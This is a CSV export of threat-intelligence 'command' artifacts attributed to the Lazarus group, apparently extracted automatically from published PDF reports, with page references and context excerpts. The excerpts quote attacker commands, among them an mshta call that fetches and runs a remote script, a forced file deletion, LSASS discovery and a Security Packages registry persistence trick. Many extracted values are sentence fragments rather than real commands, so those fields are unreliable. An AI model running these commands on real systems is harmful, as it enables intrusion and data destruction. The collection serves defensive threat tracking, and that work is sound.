schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--lazarus,artifact--sha256:45cd057f7c1f9adf130398b37f3193c93aee55067e8b70ad59cf4b95721e7142,observation--sha256:d7b74da94473e5c7196dd6e880f58ae1180ca1c02eb69516712427cc5750a19b,command,Clusters zlib [10] Curl OpenSSL 0.9.8k openssl-1.1.0f SQLite Format 3,Clusters zlib [10] Curl OpenSSL 0.9.8k openssl-1.1.0f SQLite Format 3,candidate,,unknown,unknown,not-stated,,source--lazarus--9e1ae3ccdafbc023,lazarus/multiple campaigns of the Lazarus group and their connections.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MULTI-UNIVERSE OF ADVERSARY: MULTIPLE CAMPAIGNS OF LAZARUS GROUP ... PARK 10 VIRUS BULLETIN CONFERENCE OCTOBER 2021 When a developer develops software, they usually use a public library or source code for common functionalities. Generally, malware aims to compress the data sent to the C2 server to decrease the size. If the developer creates their code for compression, it takes a lot of time and effort. So, they usually search public codes from the Internet and adapt them for their malware. In ad",
1.0.0,actor--lazarus,artifact--sha256:3efa0ae01aa487df7ac7afe15c8a6d2d25b5259a389ef17694ec91f0f98ca313,observation--sha256:eeca6bd9525984a5d7cc7e4367110261e8f6d8c58ba5d62d670c7007e82fa6cb,command,DISCOVERY T1057 Process Discovery Return information about the LSASS process cmd.exe /C powershell.exe,DISCOVERY T1057 Process Discovery Return information about the LSASS process cmd.exe /C powershell.exe,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--lazarus--5cb141837fab1486,lazarus/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Tactic Technique Description Activity DISCOVERY T1016 System Network Configuration Discovery Querying the network configuration of the local device cmd.exe /C ipconfig /all > C:\ Windows\Temp\[a-zA-Z]{8} Query default name server for supplied host/ domain name cmd.exe /C nslookup [hostname.fqdn] > C:\ WINDOWS\Temp\[a-zA-Z] {8}.tmp 2>&1 DISCOVERY T1018 Remote System Discovery List computer accounts in Active Directory , returning IP address, OS, and OS Service Pack level cmd.exe /C powershell Get",
1.0.0,actor--lazarus,artifact--sha256:40ccba73f6647308202444f323262fb5565f3d6b06ac89a9098a76d4e8342865,observation--sha256:a710ef709f6a21aa43a7aa783a5bb1d46f0d36c8d7b96d37556d3b4b01c3ffa9,command,Deletion of temporary files cmd.exe /C del /f /q /a c:\,Deletion of temporary files cmd.exe /C del /f /q /a c:\,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--lazarus--5cb141837fab1486,lazarus/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TTP Summary Tactic Technique Description Activity RESOURCE DEVELOPMENT T1587 .002 Code Signing Certificates Several binaries deployed by the threat actor were signed with a “LAMERA CORPORATION LIMITED” code signing certificate - INITIAL ACCESS T1190 Exploit Public Facing Application Compromise of CVE-2022-27925 and CVE-2022-37042 - EXECUTION T1059 Command and Scripting Interpreter Use of WMI and PowerShell to interact with host, interactive shells also used for manual execution of commands - EXE",
1.0.0,actor--lazarus,artifact--sha256:82268f524138d38bfa4255b0e8be5045aa448802e3b5af88278315b8bb34edf2,observation--sha256:c54c3dc8e52735295ac54bf8d17288208c4993f0e3e339aa3dbd6692e640e2c1,command,Deletion of temporary files cmd.exe /C net use \[Internal,Deletion of temporary files cmd.exe /C net use \[Internal,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--lazarus--5cb141837fab1486,lazarus/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TTP Summary Tactic Technique Description Activity RESOURCE DEVELOPMENT T1587 .002 Code Signing Certificates Several binaries deployed by the threat actor were signed with a “LAMERA CORPORATION LIMITED” code signing certificate - INITIAL ACCESS T1190 Exploit Public Facing Application Compromise of CVE-2022-27925 and CVE-2022-37042 - EXECUTION T1059 Command and Scripting Interpreter Use of WMI and PowerShell to interact with host, interactive shells also used for manual execution of commands - EXE",
1.0.0,actor--lazarus,artifact--sha256:40a893f56fa5d61f4bff27f3da78151280f5187560d3d7e245aea3bd986b0379,observation--sha256:8f3e4493395170b39174e42a3c9cedeace10e085ec8183dcd0abfbda1d9f9d5c,command,Execution: Mshta,Execution: Mshta,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,F-Secure.com | © F-Secure LABS 20 Malicious Document & Archive Hashes (SHA256) 09f0e82a3bad997c32605a1d3f9e40a0489b587af188fd05d4506358f2e890b4 a464781b616c86bbd68dbf909826444f7fd6c6ae378caf074926df7aebc4e3a1 7f60e13ed2e35bb2cfe4e243c71532b65d54f8b61ae7e7e789c125d274cdd3fe 306deba9a8dbb6f5ab88f2386cbe1d46735231fdc680be65d1b6654b1f9950fc b050545a7ffcbbcf96dc79354a6988fcc2f55bc76b67b59eaab36e7d238a7f62 997c4f7695a6a615da069d5f839582fdb83f215bc999e8af492636b2b5e3436c 1533374acf886bc3015c4cba3da1c67,
1.0.0,actor--lazarus,artifact--sha256:1a324d7f1b43f1527a317dd100d3d350015805bc2f2048db540343ac3ff68ec9,observation--sha256:e28139da2a63733af338bd6b4f2810f214015415e25ca6c9607e0bf55ce38d98,command,"In the F-Secure investigation, this eventually led to the download and execution of a PowerShell script that","In the F-Secure investigation, this eventually led to the download and execution of a PowerShell script that",candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure.com | © F-Secure LABS 5 mshta.exe https://bit[.]ly/2vwLE0m The link was accessed 73 times from several countries, as noted in Figure 6 below. Some of these were likely researchers, however, the spike in May, and the countries with high counts, led F-Secure to assess that this was a relatively widely-targeted lure document. Figure 6: “bit.ly” link access statistics The “bit.ly” link redirected to a domain from which a VBScript was executed to perform checks on the host and collect furthe",
1.0.0,actor--lazarus,artifact--sha256:be2f8b524e2e7eb168ec15e6419fbb1e5beb9492335c49ed0c05552fb0d4b0a1,observation--sha256:5b047b7c0f05ab3785bf96f89e2f5f6256f9eb97b22e0bad067add853ef0d8a6,command,Interpreter: PowerShell,Interpreter: PowerShell,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,F-Secure.com | © F-Secure LABS 20 Malicious Document & Archive Hashes (SHA256) 09f0e82a3bad997c32605a1d3f9e40a0489b587af188fd05d4506358f2e890b4 a464781b616c86bbd68dbf909826444f7fd6c6ae378caf074926df7aebc4e3a1 7f60e13ed2e35bb2cfe4e243c71532b65d54f8b61ae7e7e789c125d274cdd3fe 306deba9a8dbb6f5ab88f2386cbe1d46735231fdc680be65d1b6654b1f9950fc b050545a7ffcbbcf96dc79354a6988fcc2f55bc76b67b59eaab36e7d238a7f62 997c4f7695a6a615da069d5f839582fdb83f215bc999e8af492636b2b5e3436c 1533374acf886bc3015c4cba3da1c67,
1.0.0,actor--lazarus,artifact--sha256:05721f7d106f52245a97e6b10a7ca9bbd4e3e18e8676cff471cf0a11254b00ee,observation--sha256:251d60a72244a1ca8573644956e5e3016af68257f75bab6d271d2476b974262c,command,Later in the intrusion Lazarus Group was observed modifying this registry key remotely using the schtasks,Later in the intrusion Lazarus Group was observed modifying this registry key remotely using the schtasks,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure.com | © F-Secure LABS 11 CUSTOM PE LOADER F-Secure’s investigation uncovered “LSSC.dll” (72e0965385eae2d3a2f20feb361ce542235fe44c08991644a0a231f595039e68), a custom PE loader. The file was loaded into the lsass.exe process by masquerading as a “Security Package”10 via the “HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages” registry key. F-Secure observed that Lazarus Group would modify this key locally using the reg windows utility and check this was successful via the same ut",
1.0.0,actor--lazarus,artifact--sha256:f0a81557fb1b7f4afcba280ed9e9d9c555870fa8cf70dece1920e23d28feda0e,observation--sha256:f9726a6776b99ea47e0d5accb3168f855b0959066e58f2604a21b6d5c4d00ae0,command,Management Instrumentation Command-line (WMIC).,Management Instrumentation Command-line (WMIC,candidate,,unknown,unknown,not-stated,2021-02-25T00:00:00Z,source--lazarus--f6685ba8150b853c,lazarus/kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225.pdf,"{""page"": 12}","[""activity--threatneedle""]","[""malware--threatneedle""]",[],[],1,false,medium,TLP:CLEAR,pdf-text,"LAZARUS TARGETS DEFENSE INDUSTRY WITH THREATNEEDLE 11 © 2021 AO KASPERSKY LAB Credential gathering During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document. One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command: • [Responder file path] -i [IP address] -rPv Several days later, the attacker started to move laterally originat",
1.0.0,actor--lazarus,artifact--sha256:78bcf9768b98778c34e908eb51a51ed27006969325c7a1ed75ddc33ada8a85ac,observation--sha256:7c1a50e68b8ab55e334c0b7d3f3847341ea7d76b2c921a307cc5c30565f4065e,command,PowerShell and Windows/Unix command shells.,PowerShell and Windows/Unix command shells,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--lazarus--5cb141837fab1486,lazarus/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"4. Tactics, Techniques and Procedures Reconnaissance WithSecure™ do not have visibility into reconnais- sance activity as undertaken by the threat actor . It is assumed that a form of external scanning was employed to identify the vulnerable Zimbra service that was subsequently compromised. Resource Development Several binaries deployed by the threat actor were signed with a “LAMERA CORPORATION LIMITED” code signing certificate. Execution Execution took place with Impacket’s ‘atexec’ module. Var",
1.0.0,actor--lazarus,artifact--sha256:0e0f54adba7ec1c154f11e28c74e106a686e18ea9fd5f5924999c20053b0d852,observation--sha256:be23942bbc826d862dd829819f746a6fb25187796e7424f20dfa5f320a0c42fa,command,PowerShell script to automate the deployment process. We also implemented Suricata rules to detect,PowerShell script to automate the deployment process. We also implemented Suricata rules to detect,candidate,,unknown,unknown,not-stated,,source--lazarus--344872736951fe87,lazarus/The_Lazarus_Constellation.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,024 White Paper Other manually executed commands: “cmd.exe” /c “time /t” “cmd.exe” /c “echo 1000 > c:\\windows\\temp\\tmp1105.tmp” “cmd.exe” /c “type “c:\\windows\\temp\\tmp1105.tmp”” “cmd.exe” /c “type “C:\\Windows\\Temp\\temp0917.tmp”” “cmd.exe” /c “type C:\\Windows\\Temp\\TMP0389A.tmp” “cmd.exe” /c “dir “c:\\windows\\temp\\tmp1105.tmp”” “cmd.exe” /c “echo 1000 > c:\\windows\\temp\\tmp1105.tmp” “cmd.exe” /c “dir c:\\windows\\temp\\tmp1105.tmp” “cmd.exe” /c “type c:\\windows\\temp\\tmp1105.tmp”,
1.0.0,actor--lazarus,artifact--sha256:51e7c8bcfb73bc36bca1e7e85e6bbe00b0703f1402330385f430ed34869fdb7b,observation--sha256:f5b7dc35aecf02856bc217a2c6169a1ce93221ad8f0c0fdd0e999cbe088319bc,command,PowerShell:,PowerShell:,candidate,,unknown,unknown,not-stated,,source--lazarus--c328e6a5abab4da3,lazarus/MATA/Updated-MATA-attacks-Eastern-Europe_full-report_ENG.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"34 © 2023 AO KASPERSKY LAB was supposed to have been disabled once the solution was configured, but its existence had been overlooked. Following the attack, the operator deleted the server logs of the security solution in an attempt to cover his traces. However, we were able to recover partial activity logs from the solution's database. Once the operators had compiled a list of targeted systems, they leveraged the embedded EDR functionality of the compliance solution. They first obtained a scree",
1.0.0,actor--lazarus,artifact--sha256:059826eb2f45b3cdc7c4fb6ba179e2ada1842c48a3a2ea5bee3dc67ab25e7805,observation--sha256:a4815f8652cdafe40244dc1d2dc8d3e175be33fe057b35dcb5540399cbfb5694,command,Show current TCP connections on the local device cmd.exe /C netstat -naop tcp,Show current TCP connections on the local device cmd.exe /C netstat -naop tcp,candidate,,unknown,unknown,not-stated,2023-01-01T00:00:00Z,source--lazarus--5cb141837fab1486,lazarus/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Tactic Technique Description Activity DISCOVERY T1016 System Network Configuration Discovery Querying the network configuration of the local device cmd.exe /C ipconfig /all > C:\ Windows\Temp\[a-zA-Z]{8} Query default name server for supplied host/ domain name cmd.exe /C nslookup [hostname.fqdn] > C:\ WINDOWS\Temp\[a-zA-Z] {8}.tmp 2>&1 DISCOVERY T1018 Remote System Discovery List computer accounts in Active Directory , returning IP address, OS, and OS Service Pack level cmd.exe /C powershell Get",
1.0.0,actor--lazarus,artifact--sha256:c32e86e3b007566aca94fd0d77836a7f931308f26598c0ae39239cc805566ab2,observation--sha256:39c4b0617b9392b07c924bc041a7f7f05a1285aba2ae825cab1c15f0835fa7ff,command,T1047 Windows Management Instrumentation The Lazarus Group uses wmic.exe to run commands,T1047 Windows Management Instrumentation The Lazarus Group uses wmic.exe to run commands,candidate,,unknown,unknown,not-stated,,source--lazarus--09f2fa073008f6e1,lazarus/Lazarus Group Recruitment_ Threat Hunters vs Head Hunters.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 18. Chronology of attacks 7. Conclusions To identify all compromised hosts and obtain detailed information about the incident, the experts scanned the entire company's infrastructure for indicators of compromise, as well as network and file signatures of users. All possible host artifacts were also analyzed. The most useful artifacts for restoring the incident chronology were the USN Journal, EVTX Events, Jump Lists, and the MFT table. This article describes the TTPs of the Lazarus Group,",
1.0.0,actor--lazarus,artifact--sha256:6f1a2e1c906ae557974319fb893718d5dc428840d071f26f2244356ee4776fe5,observation--sha256:4519878e2dc2a8ced1003ffa0844b093cfdd3a9bfafef273908f3b2e5fc72071,command,T1218.011 Signed Binary Proxy Execution: Rundll32 A malicious DLL is launched via rundll32.exe with an indication of the exported function and with startup parameters,T1218.011 Signed Binary Proxy Execution: Rundll32 A malicious DLL is launched via rundll32.exe with an indication of the exported function and with startup parameters,candidate,,unknown,unknown,not-stated,,source--lazarus--09f2fa073008f6e1,lazarus/Lazarus Group Recruitment_ Threat Hunters vs Head Hunters.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 18. Chronology of attacks 7. Conclusions To identify all compromised hosts and obtain detailed information about the incident, the experts scanned the entire company's infrastructure for indicators of compromise, as well as network and file signatures of users. All possible host artifacts were also analyzed. The most useful artifacts for restoring the incident chronology were the USN Journal, EVTX Events, Jump Lists, and the MFT table. This article describes the TTPs of the Lazarus Group,",
